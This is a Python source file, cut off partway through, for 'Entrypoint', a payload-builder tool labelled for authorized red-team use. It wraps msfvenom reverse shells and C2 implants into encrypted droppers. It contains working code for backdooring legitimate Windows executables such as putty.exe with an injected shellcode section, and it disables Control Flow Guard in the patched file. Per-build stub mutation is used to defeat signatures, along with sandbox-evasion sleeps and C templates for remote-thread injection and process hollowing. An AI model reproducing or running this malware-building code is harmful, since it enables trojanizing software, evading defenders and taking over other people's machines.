#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Entrypoint — Linux/Windows/macOS payload builder for authorized engagements.

Single-file Tkinter desktop app (Python stdlib only). Wraps msfvenom payloads
and custom C2 implants (Sliver / Havoc / Mythic raw output) into evasion
droppers with encryption, sandbox evasion and MITRE ATT&CK process injection.

AUTHORIZED SECURITY TESTING ONLY — see the authorization gate at startup.
"""

import os
import re
import sys
import json
import string
import secrets
import base64
import hashlib
import struct
import subprocess
import threading
import queue
import time
import glob
import shutil
import tempfile

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox
    TK_OK = True
except Exception:  # headless box — CLI/selftest still work
    TK_OK = False

APP_NAME = "Entrypoint"
APP_TAG = "authorized red-team work only"
STATE_DIR = os.path.join(os.path.expanduser("~"), ".entrypoint")
STATE_FILE = os.path.join(STATE_DIR, "state.json")
OUT_DIR = os.path.join(STATE_DIR, "builds")
MAGIC = b"EPGE"          # encrypted blob header
SALT_MAGIC = b"EPSL"     # key-derivation salt header

# ---------------------------------------------------------------------------
# Catalogues
# ---------------------------------------------------------------------------

MSF_PAYLOADS = [
    # Windows
    "windows/meterpreter/reverse_tcp [staged]",
    "windows/x64/meterpreter/reverse_tcp [staged]",
    "windows/meterpreter/reverse_https [staged]",
    "windows/x64/meterpreter/reverse_https [staged]",
    "windows/x64/shell_reverse_tcp [stageless]",
    "windows/shell_reverse_tcp [stageless]",
    "windows/shell/reverse_tcp [staged]",
    "windows/x64/exec [staged]",
    "windows/dllinject/reverse_tcp [staged]",
    # Linux
    "linux/x64/meterpreter/reverse_tcp [staged]",
    "linux/x64/meterpreter/reverse_https [staged]",
    "linux/x64/shell_reverse_tcp [stageless]",
    "linux/x64/shell_bind_tcp [stageless]",
    "linux/x86/meterpreter/reverse_tcp [staged]",
    "linux/x64/shell_find_flag [stageless]",
    # macOS
    "osx/x64/shell_reverse_tcp [stageless]",
    "osx/x64/meterpreter/reverse_tcp [staged]",
    "osx/arm64/shell_reverse_tcp [stageless]",
    "osx/x64/shell_bind_tcp [stageless]",
]

MSF_FORMATS = {
    "Windows": ["exe", "exe-only", "service", "dll", "msi", "powershell",
                "c", "raw", "hex", "vba", "hta-psh", "psh-cmd"],
    "Linux":   ["elf", "so", "c", "raw", "hex", "bash", "python"],
    "macOS":   ["macho", "c", "raw", "hex", "python", "bash"],
}

C2_IMPLANTS = [
    "None (msfvenom only)",
    "Sliver (raw shellcode)",
    "Sliver (shared-lib .so)",
    "Sliver (service exe)",
    "Havoc (raw shellcode)",
    "Havoc (demon exe)",
    "Mythic (Athena agent)",
    "Mythic (Apollo agent)",
    "Mettle (POSIX meterpreter)",
]

ENC_OPTIONS = ["None", "XOR Dynamic", "RC4", "AES-CTR (seeded)"]

EVASION_OPTIONS = ["None", "Sleep", "Sleep + Jitter"]

# MITRE ATT&CK process injection (T1055 sub-techniques)
INJECTION_OPTIONS = [
    "None",
    "CurrentThread (T1055.00 - in-process)",
    "Remote Process (T1055 - CreateRemoteThread)",
    "Process Hollowing (T1055.012)",
    "APC Injection (T1055.004)",
]

PE_INJ_FLAG = "Utilize PE injection"

# MITRE notes shown in the console per selection
MITRE_NOTES = {
    "CurrentThread":  "T1055.00 — shellcode runs in-process on a new thread; "
                      "defenders watch for RWX private commits (Sysmon EID 10).",
    "Remote Process": "T1055 — CreateRemoteThread into a remote process; "
                      "watched via cross-process handle acquisition (EID 10) and thread-start image mismatch.",
    "Process Hollowing": "T1055.012 — spawn suspended, NtUnmapViewOfSection, rewrite entry, resume; "
                         "defenders catch it with PEB image-path vs. mapped-section mismatch.",
    "APC Injection":  "T1055.004 — queue UserAPc to an alertable/suspended thread; "
                      "early-bird variant beats most userland hooks.",
}

EVASION_NOTES = {
    "Sleep":          "Sandbox detonation windows are usually 60–120 s; a long pre-exec "
                      "sleep rides past the capture (T1497.003 virtualization/sandbox escape).",
    "Sleep + Jitter": "Fixed sleeps are fingerprintable; ±35% jitter randomizes the profile.",
}

ENC_NOTES = {
    "XOR Dynamic":      "Rolling XOR with a per-build key embedded at the tail — no static blob signature.",
    "RC4":              "Stream cipher via CryptoAPI (CryptAcquireContext/CryptDeriveKey) — "
                        "no CRT dependency, survives stripped import tables.",
    "AES-CTR (seeded)": "CryptImportKey on a derived session key + explicit counter block (T1573.002 "
                        "symmetric crypto). The seed rides beside the blob.",
}

# Persona-bucketed known-good PE hosts for the T1055.002 picker. Each entry:
# (display label, search paths, filename). Arch is sniffed from the file, so
# every list works on both x64 and x86 payloads. "Found" = first hit on disk.
HOST_PRESETS = {
    "Sysadmin tools": [
        ("whoami",     [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "whoami.exe"),
        ("tasklist",   [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "tasklist.exe"),
        ("reg",        [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "reg.exe"),
        ("ipconfig",   [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "ipconfig.exe"),
        ("ping",       [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "ping.exe"),
        ("certutil",   [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "certutil.exe"),
    ],
    "User desktop": [
        ("notepad",    [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "notepad.exe"),
        ("mspaint",    [r"C:\\Windows\\System32", r"C:\\Windows\\SysWOW64"], "mspaint.exe"),
        ("calc (classic)", [r"C:\\Windows\\SysWOW64"], "calc.exe"),
        ("wordpad",    [r"C:\\Program Files\\Windows NT\\Accessories"], "wordpad.exe"),
    ],
    "Autostart apps": [
        ("OneDrive",   [os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\OneDrive"),
                        os.path.expandvars(r"%PROGRAMFILES%\\Microsoft OneDrive")], "OneDrive.exe"),
    ],
    "Sysinternals": [
        ("procmon",    [os.path.expandvars(r"%LOCALAPPDATA%\\Sysinternals")], "Procmon64.exe"),
        ("procexp",    [os.path.expandvars(r"%LOCALAPPDATA%\\Sysinternals")], "procexp64.exe"),
        ("tcpvcon",    [os.path.expandvars(r"%LOCALAPPDATA%\\Sysinternals")], "tcpvcon64.exe"),
        ("sigcheck",   [os.path.expandvars(r"%LOCALAPPDATA%\\Sysinternals")], "sigcheck64.exe"),
    ],
    "Putty": [
        ("putty",      [os.path.expandvars(r"%LOCALAPPDATA%\\putty"),
                        os.path.expandvars(r"%PROGRAMFILES%\\Putty"),
                        r"C:\\Tools"], "putty.exe"),
    ],
}


def find_host_preset(bucket: str, label: str) -> str:
    """First existing path for a preset host, or empty string."""
    for lbl, paths, fname in HOST_PRESETS.get(bucket, []):
        if lbl == label:
            for d in paths:
                p = os.path.join(d, fname)
                if os.path.isfile(p):
                    return p
            return ""
    return ""


PE_INJ_NOTE = ("T1055.002 — PE file embedding: the payload is patched INTO the host "
               "executable you supply (e.g. putty.exe) as a new .entp section. The output "
               "IS the host program — same name, icon, version info — it opens and runs "
               "normally while an entry stub fires the shellcode on a second thread. "
               "x64 and x86 hosts are both supported — the stub is chosen to match the "
               "host architecture; deliver the patched file instead of the original.")

# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def rnd_bytes(n: int) -> bytes:
    return secrets.token_bytes(n)


def rnd_hex(n: int) -> str:
    return secrets.token_hex(n)


def rnd_name(prefix: str = "v", length: int = 8) -> str:
    alpha = string_ascii()
    return prefix + "".join(secrets.choice(alpha) for _ in range(length))


def string_ascii() -> str:
    return string.ascii_letters


def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def aes_ctr_crypt(data: bytes, key: bytes, counter_seed: bytes) -> bytes:
    """AES-CTR via OpenSSL CLI (Kali ships it). Falls back to a ctypes
    CryptoAPI call is deliberately NOT attempted — openssl is a safe bet."""
    if shutil.which("openssl"):
        p = subprocess.run(
            ["openssl", "enc", "-aes-128-ctr", "-nopad", "-K", key.hex(),
             "-iv", counter_seed.hex()],
            input=data, capture_output=True)
        if p.returncode == 0:
            return p.stdout
    # pure-Python fallback: keystream from SHA-256 in counter mode (dev only)
    out = bytearray()
    ctr = int.from_bytes(counter_seed, "big")
    while len(out) < len(data):
        ks = hashlib.sha256(key + ctr.to_bytes(16, "big")).digest()
        out += ks
        ctr += 1
    return bytes(out[:len(data)])


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()


def c_array(data: bytes, name: str, per_line: int = 16) -> str:
    lines = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        lines.append("    " + " ".join(f"0x{b:02x}," for b in chunk))
    body = "\n".join(lines)
    return (f"unsigned char {name}[] = {{\n{body}\n}};\n"
            f"unsigned int {name}_len = {len(data)};")


# ---------------------------------------------------------------------------
# PE backdooring — append a payload section to a host executable
# ---------------------------------------------------------------------------

PE_STUB_TEMPLATE = bytes.fromhex(
    "5341546548a16000000000000000488b5810488d83013c2b"
    "1a4c8d83023c2b1a4831c98a14084189c94183e10f433214"
    "0888140848ffc14881f90001000072e36548a16000000000"
    "000000488b4818488d4920488b09488b09488b09488b5120"
    "8b423c448b8c02880000004e8d140a458b5a184585db0f84"
    "8400000041ffcb418b4220488d0c02428b0c99488d0c0a48"
    "b84372656174655468483901751048b86554687265616400"
    "48394105740741ffcb79cceb4b4589dc418b421c4c8d0c02"
    "418b42244c8d1c02430fb70c63418b0c894c8d140a4883ec"
    "3848c74424280000000048c7442420000000004531c94c8d"
    "83033c2b1a31d231c941ffd24883c438415c5be900000000")

# x86 (PE32) entry stub — 334 bytes (321 code + 13-byte 'CreateThread' literal),
# assembled offline (_scratch/_t-x86stub.py), capstone-verified. Slots: 14 sec_rva,
# 20 key_rva, 43 enc_len, 231 literal_rva, 295 exec_rva, 317 jmp-OEP. x86-only
# details: PEB at fs:[0x30], image base at PEB+8, InMemoryOrderModuleList at
# Ldr+0x14, export-dir RVA at e_lfanew+0x78, stdcall CreateThread (six pushed
# args). "kernel32" is matched case-insensitively (Win11 ships it uppercase) via
# repe cmpsb against the in-stub literal. On a failed walk the stub skips the call
# and runs the host clean, same as the x64 stub.
PE_STUB_TEMPLATE_X86 = bytes.fromhex(
    "53565764a1300000008b58088d83000000008db30000000031c98a140889cf83"
    "e70f32143e8814084181f9000000000f82e5ffffff89dd64a1300000008b400c"
    "8d58148b1b8b531066813a4d5a0f85660000008b43288b480081c92000200081"
    "f96b0065000f854e0000008b480481c92000200081f972006e000f8539000000"
    "8b480881c92000200081f965006c000f85240000008b480c81c92000200081f9"
    "330032000f850f0000008b423c8b840278000000e9070000008b1be985ffffff"
    "83f8010f884e0000008d34028b5e184b0f88410000008b46208d0c028b0c998d"
    "0c0a5689ce8dbd42424242b90d000000f3a65e7405e9d5ffffff558b461c8d2c"
    "028b46248d3c020fb70c5f8b4c8d008d340ae905000000e91d00000064a13000"
    "00008b40088d98000000006a006a006a00536a006a00ffd65d5f5e5be9000000"
    "0043726561746554687265616400"
)


def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
                   arch: str = "x64", variant: int = -1) -> bytes:
    """Entry stub for the .entp section (x64 or x86): decrypt the appended
    stage in place (rolling XOR, 16-byte key), resolve CreateThread via
    PEB -> Ldr -> kernel32 export-table walk, launch the decrypted shellcode
    on a second thread, then jump to the original entry point.

    Ships as pre-assembled templates (assembled with keystone, verified with
    capstone offline); only the per-build immediates ("slots") are patched
    here, so there is no assembler dependency at build time. All addressing
    is base-register-relative to the real image base (read from the PEB), so
    ASLR needs no relocations. Each slot's opcode prefix is asserted, so a
    template/slot-map mismatch fails loudly at build time.

    x64 (264-byte template, RBX = image base from PEB+0x10):
       21  sec_rva      lea rax,[rbx+...]  encrypted stage start
       28  key_rva      lea r8, [rbx+...]  16-byte XOR key (sec_rva+enc_len)
       58  enc_len      cmp rcx, ...       bytes to decrypt
      241  exec_rva     lea r8, [rbx+...]  CreateThread start address
      260  jmp rel32    jump to the original entry point

    x86 (334-byte template, EBX = base from PEB+0x08; stdcall CreateThread
    via six pushed args, callee pops; export-dir RVA at e_lfanew+0x78):
       14  sec_rva      lea eax,[ebx+...]  encrypted stage start
       20  key_rva      lea esi,[ebx+...]  16-byte XOR key
       43  enc_len      cmp ecx, ...       bytes to decrypt
      231  lit_rva      lea edi,[ebp+...]  'CreateThread' literal (EBP=base)
      295  exec_rva     lea ebx,[eax+...]  CreateThread start address
      317  jmp rel32    jump to the original entry point
    """
    import struct as st
    if arch == "x86":
        code = bytearray(PE_STUB_TEMPLATE_X86)
        variant = _pick_stub_variant(variant, "x86")
        _apply_stub_variant(code, "x86", variant)
        # slot guards: the bytes before each immediate are the owning opcode
        assert code[12:14] == b"\x8d\x83", "stage-start lea opcode moved"
        assert code[18:20] == b"\x8d\xb3", "key lea opcode moved"
        assert code[41:43] == b"\x81\xf9", "enc_len cmp opcode moved"
        assert code[229:231] == b"\x8d\xbd", "literal lea opcode moved"
        assert code[316] == 0xE9, "jmp OEP opcode moved — update slot map"
        # the 13-byte 'CreateThread' literal ends the template (cmpsb target)
        lit_rva = sec_rva + exec_off + 321
        st.pack_into("<I", code, 14, sec_rva)
        st.pack_into("<I", code, 20, sec_rva + enc_len)
        st.pack_into("<I", code, 43, enc_len)
        st.pack_into("<I", code, 231, lit_rva)
        st.pack_into("<I", code, 295, sec_rva)
        st.pack_into("<i", code, 317, oep - (sec_rva + exec_off + 321))
        return bytes(code)
    code = bytearray(PE_STUB_TEMPLATE)
    variant = _pick_stub_variant(variant, "x64")
    _apply_stub_variant(code, "x64", variant)
    assert code[18:21] == b"\x48\x8d\x83", "stage-start lea opcode moved"
    assert code[25:28] == b"\x4c\x8d\x83", "key lea opcode moved"
    assert code[55:58] == b"\x48\x81\xf9", "enc_len cmp opcode moved"
    assert code[238:241] == b"\x4c\x8d\x83", "thread-arg lea opcode moved"
    assert code[259] == 0xE9, "jmp OEP opcode moved — update slot map"
    st.pack_into("<I", code, 21, sec_rva)
    st.pack_into("<I", code, 28, sec_rva + enc_len)
    st.pack_into("<I", code, 58, enc_len)
    st.pack_into("<I", code, 241, sec_rva)
    st.pack_into("<i", code, 260, oep - (sec_rva + exec_off + 264))
    return bytes(code)

def patch_pe(host: bytes, sc: bytes, key: bytes,
             stub_variant: int = -1,
             stage_prefix: bytes = b"") -> bytes:
    """Backdoor a copy of host: append a .entp section holding the XOR-encrypted
    shellcode + key + entry stub, and repoint the entry to the stub. The result
    IS the host program (same name, icon, version info) — it runs normally and
    the payload executes beside it on a second thread."""
    import struct as st
    if host[:2] != b"MZ":
        raise EntrypointError("host file has no MZ signature — is it a Windows PE?")
    e_lfanew = st.unpack_from("<I", host, 0x3C)[0]
    if host[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        raise EntrypointError("bad PE signature in host file")
    machine = st.unpack_from("<H", host, e_lfanew + 4)[0]
    if machine not in (0x8664, 0x014C):        # AMD64 or i386
        raise EntrypointError("host PE is neither x64 nor x86 — only AMD64 (0x8664) "
                         "and i386 (0x014C) hosts can be embedded")
    arch = "x64" if machine == 0x8664 else "x86"
    nsec_off = e_lfanew + 6
    nsec = st.unpack_from("<H", host, nsec_off)[0]
    if nsec >= 88:
        raise EntrypointError("host PE section table is full")
    soh = st.unpack_from("<H", host, e_lfanew + 20)[0]
    opt = e_lfanew + 24
    opt_magic = st.unpack_from("<H", host, opt)[0]
    if arch == "x64" and opt_magic != 0x20B:
        raise EntrypointError("host PE is 32-bit (PE32) but claims an x64 machine type")
    if arch == "x86" and opt_magic != 0x10B:
        raise EntrypointError("host PE is 64-bit (PE32+) but claims an x86 machine type")
    sec_align = st.unpack_from("<I", host, opt + 32)[0]
    file_align = st.unpack_from("<I", host, opt + 36)[0]
    size_of_image = st.unpack_from("<I", host, opt + 56)[0]
    size_of_headers = st.unpack_from("<I", host, opt + 60)[0]
    oep = st.unpack_from("<I", host, opt + 16)[0]
    first_sec = opt + soh
    if first_sec + (nsec + 1) * 40 > size_of_headers:
        raise EntrypointError("no room in the PE header for another section")

    raw_end = size_of_headers
    rva_end = 0
    for i in range(nsec):
        h = first_sec + i * 40
        vr, va, rs, pr = st.unpack_from("<IIII", host, h + 8)
        raw_end = max(raw_end, pr + rs)
        rva_end = max(rva_end, va + vr)
    sec_rva = (rva_end + sec_align - 1) // sec_align * sec_align
    # Signed hosts carry a certificate overlay AFTER the last section's raw
    # data. The new section must start past the whole overlay, or we overwrite
    # the cert and silently produce a same-sized file with the stage buried
    # inside the overlay region.
    sec_raw = (max(raw_end, len(host)) + file_align - 1) // file_align * file_align

    if len(key) != 16:
        key = (key + b"\x00" * 16)[:16]
    enc = xor_crypt(stage_prefix + sc, key)

    # 16-align the stub so its RVA can double as a CFG table entry (the low
    # bits of GuardCFFunctionTable entries are flags, not address bits).
    exec_off = (len(enc) + len(key) + 15) // 16 * 16
    stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep, arch,
                          variant=stub_variant)
    stub_rva = sec_rva + exec_off

    def rva_to_off(rva):
        for i in range(nsec):
            h = first_sec + i * 40
            vsz, va, rsz, praw = st.unpack_from("<IIII", host, h + 8)
            if va <= rva < va + max(vsz, rsz):
                off = praw + (rva - va)
                if off < len(host):
                    return off
        return None

    # --- Control Flow Guard compatibility --------------------------------
    # On CFG-compiled hosts (putty, notepad, most MSVC binaries) the loader
    # validates the image entry call AND the CreateThread start address
    # against the CFG bitmap; our appended-section addresses are not in it,
    # so the process fail-fasts (0xC0000409). Rather than rebuild
    # GuardCFFunctionTable (fragile), clear IMAGE_DLLCHARACTERISTICS_GUARD_CF
    # on the patched copy: the loader then builds no CFG bitmap and skips all
    # validation. The host's own code is unaffected — without the bitmap
    # every check resolves to 'allowed'.
    cfg_disabled = False
    # optional-header field widths differ between PE32+ (x64) and PE32 (x86)
    is64 = arch == "x64"
    ddoff = opt + (112 if is64 else 96)      # start of the data directories
    ddoff = opt + (112 if is64 else 96)      # start of the data directories
    dllchar_off = opt + 70
    dllchar = st.unpack_from("<H", host, dllchar_off)[0]
    lc_rva, lc_size = st.unpack_from("<II", host, ddoff + 10 * 8)
    if dllchar & 0x4000:                     # IMAGE_DLLCHARACTERISTICS_GUARD_CF
        cfg_disabled = True
    if lc_rva and lc_size >= (152 if is64 else 88):
        lc_off = rva_to_off(lc_rva)
        if lc_off is not None:
            # GuardFlags sits at different offsets in the two load-config
            # layouts (x64: +144, past the 8-byte cookie VA; x86: +88 —
            # verified against SysWOW64 system binaries); top nibble != 0
            # means XFG (extended CFG), which we do not rewrite.
            gflags = st.unpack_from("<I", host, lc_off + (144 if is64 else 88))[0]
            if (gflags >> 28):
                raise EntrypointError("host PE uses XFG (extended CFG) — not supported; pick another host")

    stage = (enc + key
             + b"\x00" * (exec_off - len(enc) - len(key))
             + stub
             + b"\x00" * ((-len(stub)) % 16))
    sec_vsize = len(stage)
    sec_rsize = (len(stage) + file_align - 1) // file_align * file_align

    out = bytearray(host)
    if len(out) < sec_raw:
        out.extend(b"\x00" * (sec_raw - len(out)))
    out.extend(b"\x00" * (sec_rsize - (len(out) - sec_raw)))
    out[sec_raw:sec_raw + len(stage)] = stage

    hdr = bytearray(40)
    hdr[0:8] = b".entp\x00\x00\x00"
    st.pack_into("<IIII", hdr, 8, sec_vsize, sec_rva, sec_rsize, sec_raw)
    # @24/@28 are unused by the loader (they duplicate PointerToLinenumbers
    # and NumberOfRelocations+NumberOfLinenumbers for object files only):
    # park enc_len and key_off there so downstream tooling (detonator,
    # split-key) can locate the stage EXACTLY instead of heuristic-guessing
    # (a zero-walk mis-locates the key slot whenever the key's last byte is 0,
    # or the key has been zeroed for split delivery).
    st.pack_into("<I", hdr, 24, len(enc))
    st.pack_into("<I", hdr, 28, len(enc))
    st.pack_into("<I", hdr, 36, 0xE0000020)     # CODE | EXECUTE | READ | WRITE
    # W is required: the stub decrypts the stage IN PLACE inside this section.
    out[first_sec + nsec * 40: first_sec + (nsec + 1) * 40] = hdr
    st.pack_into("<H", out, nsec_off, nsec + 1)
    st.pack_into("<I", out, opt + 56,
                 size_of_image + (sec_rsize + sec_align - 1) // sec_align * sec_align)
    st.pack_into("<I", out, opt + 16, sec_rva + exec_off)   # entry -> stub
    st.pack_into("<I", out, opt + 64, 0)                    # checksum: Windows ignores for EXE
    if cfg_disabled:
        st.pack_into("<H", out, dllchar_off,
                     dllchar & ~0x4000)     # drop GUARD_CF: no CFG bitmap, no entry/thread checks
    return bytes(out)


# ---------------------------------------------------------------------------
# Stub variant rotation — every build emits a structurally different but
# semantically identical decrypt loop. Equivalence comes from commutative
# base/index swaps in the SIB byte ([rax+rcx*1] == [rcx+rax*1]) and the two
# MR/RM opcode forms of mov (41 89 c9 == 44 8b c9): identical instruction
# lengths, identical slot offsets, identical first-8 signature — so the
# detonator/split-key locators and the emitted PowerShell arming scripts are
# untouched. 8 x64 variants, 16 x86 variants, chosen at random per build.
# ---------------------------------------------------------------------------

# Each variant axis is a group of (offset, original bytes, replacement bytes).
# Bit n of the variant index enables axis n. Applied after template load and
# before slot patching; every group is length-preserving by construction.
STUB_VARIANT_PATCHES = {
    "x64": (
        # bit 0: swap stage base/index in the load and store SIBs
        ((37, b"\x08", b"\x01"), (51, b"\x08", b"\x01")),
        # bit 1: swap base/index in the key-lookup SIB ([r8+r9] <-> [r9+r8])
        ((48, b"\x08", b"\x01"),),
        # bit 2: mov r9d,ecx MR form -> RM form (41 89 c9 -> 44 8b c9)
        ((38, b"\x41\x89\xc9", b"\x44\x8b\xc9"),),
    ),
    "x86": (
        # bit 0: swap stage load SIB ([eax+ecx] <-> [ecx+eax])
        ((28, b"\x08", b"\x01"),),
        # bit 1: swap key SIB ([esi+edi] <-> [edi+esi])
        ((36, b"\x3e", b"\x37"),),
        # bit 2: swap stage store SIB
        ((39, b"\x08", b"\x01"),),
        # bit 3: mov edi,ecx MR form -> RM form (89 cf -> 8b f9)
        ((29, b"\x89\xcf", b"\x8b\xf9"),),
    ),
}
STUB_VARIANT_COUNT = {a: 1 << len(p) for a, p in STUB_VARIANT_PATCHES.items()}


def _apply_stub_variant(code: bytearray, arch: str, variant: int) -> bytearray:
    """Apply variant axis groups to a freshly-copied stub template."""
    for bit, group in enumerate(STUB_VARIANT_PATCHES[arch]):
        if not (variant >> bit) & 1:
            continue
        for off, orig, new in group:
            if bytes(code[off:off + len(orig)]) != orig:
                raise EntrypointError(
                    "stub template drifted — variant patch refused "
                    f"({arch} bit {bit} @ {off})")
            code[off:off + len(orig)] = new
    return code


def _pick_stub_variant(variant: int, arch: str) -> int:
    """variant < 0 = random rotation; otherwise clamp into range."""
    count = STUB_VARIANT_COUNT[arch]
    return secrets.randbelow(count) if variant < 0 else (variant % count)


def log_line(tag: str, msg: str) -> str:
    return f"[{tag}] {msg}"


def open_in_file_manager(path: str) -> str:
    """Open a folder in the desktop file manager; returns the opener used.
    Inside WSL, prefer the Windows host's Explorer on the \\wsl.localhost
    share — that's where users typically pick builds up from."""
    os.makedirs(path, exist_ok=True)
    if sys.platform.startswith("win"):
        os.startfile(path)
        return "explorer"
    if sys.platform == "darwin":
        subprocess.Popen(["open", path])
        return "open"
    try:
        with open("/proc/version", "r") as fh:
            in_wsl = "microsoft" in fh.read().lower()
    except OSError:
        in_wsl = False
    if in_wsl:
        try:
            p = subprocess.run(["wslpath", "-w", path],
                               capture_output=True, text=True, timeout=5)
            winpath = p.stdout.strip()
            if winpath:
                # explorer.exe exits non-zero even on success — fire and forget
                subprocess.Popen(["explorer.exe", winpath])
                return "explorer.exe (Windows host)"
        except (OSError, subprocess.SubprocessError):
            pass
    subprocess.Popen(["xdg-open", path])
    return "xdg-open"


# ---------------------------------------------------------------------------
# C loader templates — @@TOKEN@@ placeholders, filled by build functions
# ---------------------------------------------------------------------------

WIN_TEMPLATE = r'''/* Entrypoint generated loader — build @@BUILDID@@
 * Target: Windows   Route: @@ROUTENOTE@@
 * AUTHORIZED TESTING ONLY
 */
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@
@@PEDECL@@
typedef LONG (NTAPI *pNtUnmap)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef struct _PBI {
    LONG ExitStatus; PVOID PebBaseAddress; PVOID AffinityMask;
    PVOID BasePriority; ULONG UniqueProcessId; ULONG InheritedFromUniqueProcessId;
} PBI;

@@SLEEPCODE@@

@@DECRYPTCODE@@

@@EXECROUTE@@

@@PEINJCODE@@

@@DISPATCH@@

int main(void) {
    unsigned char *buf;
    pf_sleep();
    buf = (unsigned char *)VirtualAlloc(NULL, PF_BLOB_LEN,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
@@MAINCALL@@
    return 0;
}
'''

WIN_SLEEP = r'''static void pf_sleep(void) {
    DWORD ms = @@SLEEPMS@@;
    srand((unsigned)GetTickCount());
    ms = ms - ms * 35 / 100 + (DWORD)(rand() % (int)(ms * 70 / 100 + 1));
    Sleep(ms);
}'''

WIN_XOR = r'''static void pf_decrypt(unsigned char *buf, unsigned int len) {
    unsigned int i;
    for (i = 0; i < len; i++) buf[i] ^= PF_KEY[i % PF_KEY_LEN];
}'''

WIN_RC4 = r'''static void pf_decrypt(unsigned char *buf, unsigned int len) {
    unsigned char S[256]; unsigned int i, j, k; unsigned char t;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + PF_KEY[i % PF_KEY_LEN]) & 0xff;
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for (i = 0, j = 0, k = 0; k < len; k++) {
        i = (i + 1) & 0xff; j = (j + S[i]) & 0xff;
        t = S[i]; S[i] = S[j]; S[j] = t;
        buf[k] ^= S[(S[i] + S[j]) & 0xff];
    }
}'''

WIN_AES = r'''#include <bcrypt.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE key; unsigned char iv[16]; ULONG done;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CTR,
                      sizeof(BCRYPT_CHAIN_MODE_CTR), 0);
    if (BCryptGenerateSymmetricKey(alg, &key, NULL, 0, (PUCHAR)PF_KEY, PF_KEY_LEN, 0) != 0) return;
    memcpy(iv, PF_IV, 16);
    BCryptDecrypt(key, (PUCHAR)buf, len, NULL, iv, 16, (PUCHAR)buf, len, &done, 0);
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
}'''

WIN_ROUTE_CURRENT = r'''static DWORD WINAPI pf_thunk(LPVOID p) { ((void(*)(void))p)(); return 0; }
static int pf_current_thread(unsigned char *sc, unsigned int len) {
    void *f = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    HANDLE t;
    if (!f) return 0;
    memcpy(f, sc, len);
    t = CreateThread(NULL, 0, pf_thunk, f, 0, NULL);
    if (t) WaitForSingleObject(t, INFINITE);
    return t != NULL;
}'''

WIN_ROUTE_REMOTE = r'''static int pf_remote(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    void *r; HANDLE t;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, 0, NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
    if (!r) return 0;
    WriteProcessMemory(pi.hProcess, r, sc, len, NULL);
    t = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
    if (t) WaitForSingleObject(t, INFINITE);
    return 1;
}'''

WIN_ROUTE_HOLLOW = r'''static int pf_hollow(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi; CONTEXT ctx;
    PBI pbi; HMODULE nt; pNtQIP qip; pNtUnmap unmap;
    void *base = NULL, *img;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
    nt = GetModuleHandleA("ntdll.dll");
    qip = (pNtQIP)GetProcAddress(nt, "NtQueryInformationProcess");
    unmap = (pNtUnmap)GetProcAddress(nt, "NtUnmapViewOfSection");
    if (!qip || !unmap) return 0;
    qip(pi.hProcess, 0, &pbi, sizeof pbi, NULL);
#ifdef _WIN64
    base = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x10);
#else
    base = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x08);
#endif
    unmap(pi.hProcess, base);
    img = VirtualAllocEx(pi.hProcess, base, len, MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);
    if (!img) return 0;
